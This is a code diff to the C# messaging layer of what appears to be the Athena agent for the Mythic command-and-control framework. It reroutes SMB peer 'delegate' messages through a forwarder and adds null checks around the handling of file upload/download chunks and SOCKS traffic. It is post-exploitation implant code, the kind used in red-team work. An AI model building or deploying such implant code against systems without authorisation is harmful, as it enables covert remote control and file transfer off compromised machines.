@@ -36,9 +36,9 @@ namespace Athena
             };
             var responseString = this.MythicConfig.currentConfig.Send(ct).Result;
             try
-            {              
+            {
                 CheckinResponse cs = JsonConvert.DeserializeObject<CheckinResponse>(responseString);
-                if(cs == null)
+                if (cs == null)
                 {
                     cs = new CheckinResponse()
                     {
@@ -61,11 +61,11 @@ namespace Athena
             {
                 action = "get_tasking",
                 tasking_size = -1,
-                delegates = Globals.mc.MythicConfig.smbConfig.GetMessages(),
+                delegates = Globals.mc.MythicConfig.smbForwarder.messageOut,
                 //socks = Globals.socksHandler.getMessages() ?? new List<SocksMessage>(),
                 socks = new List<SocksMessage>()
             };
-            
+
             try
             {
                 var responseString = this.MythicConfig.currentConfig.Send(gt).Result;
@@ -74,8 +74,8 @@ namespace Athena
                 {
                     return null;
                 }
-
-                GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(responseString); 
+                Globals.mc.MythicConfig.smbForwarder.messageOut.Clear();
+                GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(responseString);
 
                 //This can be cleaned up.
                 if (gtr != null)
@@ -90,9 +90,9 @@ namespace Athena
 
                     if (gtr.delegates != null && gtr.delegates.Count > 0)
                     {
-                        foreach(var del in gtr.delegates)
+                        foreach (var del in gtr.delegates)
                         {
-                            Globals.mc.MythicConfig.smbConfig.Send(del);
+                            Globals.mc.MythicConfig.smbForwarder.ForwardDelegateMessage(del);
                         }
                     }
                     return gtr.tasks;
@@ -108,18 +108,19 @@ namespace Athena
             }
         }
 
-        public bool SendResponse(Dictionary<string,MythicJob> jobs)
+        public bool SendResponse(Dictionary<string, MythicJob> jobs)
         {
             List<ResponseResult> lrr = new List<ResponseResult>();
 
-            foreach(var job in jobs.Values)
+            foreach (var job in jobs.Values)
             {
                 switch (job.task.command)
                 {
                     case "upload":
                         MythicUploadJob uj = Globals.uploadJobs[job.task.id];
-                        
-                        if (!uj.uploadStarted) {
+
+                        if (!uj.uploadStarted)
+                        {
                             UploadResponse ur = new UploadResponse()
                             {
                                 task_id = uj.task.id,
@@ -146,7 +147,7 @@ namespace Athena
                                     full_path = uj.path
                                 },
                                 completed = "true"
-                                
+
                             };
                             lrr.Add(ur);
                         }
@@ -205,7 +206,7 @@ namespace Athena
                                     file_id = j.file_id,
                                     completed = "true",
                                     total_chunks = -1
-                                    
+
                                 };
                                 lrr.Add(dr);
                             }
@@ -289,7 +290,7 @@ namespace Athena
                 action = "post_response",
                 responses = lrr,
                 socks = Globals.socksHandler.getMessages() ?? new List<SocksMessage>(),
-                delegates = Globals.mc.MythicConfig.smbConfig.GetMessages(),
+                delegates = Globals.mc.MythicConfig.smbForwarder.messageOut,
             };
 
             //Things that will likely break in the event this function fails at the wrong time
@@ -300,12 +301,11 @@ namespace Athena
             try
             {
                 var responseString = this.MythicConfig.currentConfig.Send(prr).Result;
-
                 if (string.IsNullOrEmpty(responseString))
                 {
                     return false;
                 }
-
+                Globals.mc.MythicConfig.smbForwarder.messageOut.Clear();
                 if (responseString.Contains("chunk_data"))
                 {
                     PostUploadResponseResponse cs = JsonConvert.DeserializeObject<PostUploadResponseResponse>(responseString);
@@ -321,7 +321,7 @@ namespace Athena
                         {
                             foreach (var del in cs.delegates)
                             {
-                                Globals.mc.MythicConfig.smbConfig.Send(del);
+                                Globals.mc.MythicConfig.smbForwarder.ForwardDelegateMessage(del);
                             }
                         }
                         //Pass up socks messages
@@ -334,50 +334,54 @@ namespace Athena
                         }
 
                         //Handle Upload/Download Responses
-                        foreach (var response in cs.responses)
+                        if (cs.responses != null)
                         {
-                            //Spin off new thread to upload new chunks
-                            if (!String.IsNullOrEmpty(response.chunk_data))
+                            //Handle Upload/Download Responses
+                            foreach (var response in cs.responses)
                             {
-                                //Spin up new task to handle uploads/downloads
-                                Task.Run(() =>
+                                //Spin off new thread to upload new chunks
+                                if (!String.IsNullOrEmpty(response.chunk_data))
                                 {
-                                    try
+                                    //Spin up new task to handle uploads/downloads
+                                    Task.Run(() =>
                                     {
-                                        //Upload
-                                        if (Globals.uploadJobs.ContainsKey(response.task_id))
+                                        try
                                         {
-                                            //Get upload and mythic job
-                                            MythicUploadJob uj = Globals.uploadJobs[response.task_id];
-                                            MythicJob job = Globals.jobs[response.task_id];
-
-                                            uj.uploadChunk(response.chunk_num, Misc.Base64DecodeToByteArray(response.chunk_data), job);
-                                        }
-
-                                        //Download
-                                        else if (Globals.downloadJobs.ContainsKey(response.task_id))
-                                        {
-                                            if (!String.IsNullOrEmpty(response.file_id))
+                                            //Upload
+                                            if (Globals.uploadJobs.ContainsKey(response.task_id))
                                             {
-                                                MythicDownloadJob j = Globals.downloadJobs[response.task_id];
-                                                if (string.IsNullOrEmpty(j.file_id))
+                                                //Get upload and mythic job
+                                                MythicUploadJob uj = Globals.uploadJobs[response.task_id];
+                                                MythicJob job = Globals.jobs[response.task_id];
+
+                                                uj.uploadChunk(response.chunk_num, Misc.Base64DecodeToByteArray(response.chunk_data), job);
+                                            }
+
+                                            //Download
+                                            else if (Globals.downloadJobs.ContainsKey(response.task_id))
+                                            {
+                                                if (!String.IsNullOrEmpty(response.file_id))
                                                 {
-                                                    j.file_id = response.file_id;
-                                                    j.hasoutput = false;
+                                                    MythicDownloadJob j = Globals.downloadJobs[response.task_id];
+                                                    if (string.IsNullOrEmpty(j.file_id))
+                                                    {
+                                                        j.file_id = response.file_id;
+                                                        j.hasoutput = false;
+                                                    }
                                                 }
                                             }
                                         }
-                                    }
-                                    catch (Exception e)
-                                    {
-                                        MythicJob job = Globals.jobs[response.task_id];
-                                        job.errored = true;
-                                        job.complete = true;
-                                        job.taskresult = e.Message;
-                                        job.hasoutput = true;
-                                    }
-                                });
-                                
+                                        catch (Exception e)
+                                        {
+                                            MythicJob job = Globals.jobs[response.task_id];
+                                            job.errored = true;
+                                            job.complete = true;
+                                            job.taskresult = e.Message;
+                                            job.hasoutput = true;
+                                        }
+                                    });
+
+                                }
                             }
                         }
                     }
@@ -387,7 +391,7 @@ namespace Athena
                     PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(responseString);
 
                     //Check for socks messages to pass on
-                    if(cs.socks != null)
+                    if (cs.socks != null)
                     {
                         foreach (var s in cs.socks)
                         {
@@ -400,27 +404,30 @@ namespace Athena
                     {
                         foreach (var del in cs.delegates)
                         {
-                            Globals.mc.MythicConfig.smbConfig.Send(del);
+                            Globals.mc.MythicConfig.smbForwarder.ForwardDelegateMessage(del);
                         }
                     }
 
                     //Todo Change this to make use of an object instead of trying to mess with threads. (Example how SOCKS is handled)
                     //Check for file chunks to pass on
-                    foreach (var response in cs.responses)
+                    if (cs.responses != null)
                     {
-                        if (!String.IsNullOrEmpty(response.file_id))
+                        foreach (var response in cs.responses)
                         {
-                            MythicDownloadJob j = Globals.downloadJobs[response.task_id];
-                            if (string.IsNullOrEmpty(j.file_id))
+                            if (!String.IsNullOrEmpty(response.file_id))
                             {
-                                j.file_id = response.file_id;
-                                j.hasoutput = false;
+                                MythicDownloadJob j = Globals.downloadJobs[response.task_id];
+                                if (string.IsNullOrEmpty(j.file_id))
+                                {
+                                    j.file_id = response.file_id;
+                                    j.hasoutput = false;
+                                }
                             }
                         }
                     }
-                } 
+                }
             }
-            catch (Exception e)
+            catch
             {
                 return false;
             }
